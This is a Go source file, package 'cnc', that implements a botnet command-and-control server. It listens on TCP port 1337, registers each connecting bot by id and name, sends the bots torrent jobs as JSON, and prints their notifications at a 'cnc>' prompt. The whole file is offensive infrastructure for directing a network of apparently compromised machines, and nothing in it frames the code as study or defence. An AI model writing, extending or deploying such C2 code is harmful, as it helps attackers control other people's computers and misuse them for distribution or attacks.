package cnc

import (
	"bufio"
	"encoding/json"
	"fmt"
	"net"
	"net/textproto"
	"strings"
)

type Bot struct {
	Connection net.Conn
	Torrents   []QueueTorrent
	id         string
	name       string
}

var Bots []Bot

//BeginListen - start listening for connections
func BeginListen() {
	listener, listenErr := net.Listen("tcp", ":1337")

	if listenErr != nil {

	}

	for {
		conn, conErr := listener.Accept()

		if conErr != nil {
			//error
		}

		go handleConnection(conn)
	}
}

//SendTorrent - send torrent trough a connection
func SendTorrent(connection net.Conn, torrent QueueTorrent) {
	writer := bufio.NewWriter(connection)
	tpw := textproto.NewWriter(writer)

	torrentJson, err := json.Marshal(torrent)

	if err == nil {
		tpw.PrintfLine(string(torrentJson))
	}
}

func parseMessage(message string) (string, string) {

	parsedMessage := strings.Split(message, "::")
	messageType := parsedMessage[0]

	if messageType == "notification" {
		return messageType, "\n[+] " + parsedMessage[1]
	} else if messageType == "botid" {
		return messageType, parsedMessage[1]
	}

	return messageType, "The bot send an invalid message"

}

func messageLoop(connection net.Conn) {
	reader := bufio.NewReader(connection)
	tpr := textproto.NewReader(reader)

	for {

		message, err := tpr.ReadLine()

		if err == nil {
			_, message := parseMessage(message)
			fmt.Println(message)
			fmt.Print("cnc>")
		}

	}

}

func handleConnection(connection net.Conn) {
	var message string

	reader := bufio.NewReader(connection)
	tpr := textproto.NewReader(reader)

	message, _ = tpr.ReadLine()
	_, botid := parseMessage(message)

	message, _ = tpr.ReadLine()
	_, botname := parseMessage(message)

	bot := Bot{
		Connection: connection,
		id:         botid,
		name:       botname,
	}

	Bots = append(Bots, bot)

	go messageLoop(connection)
}
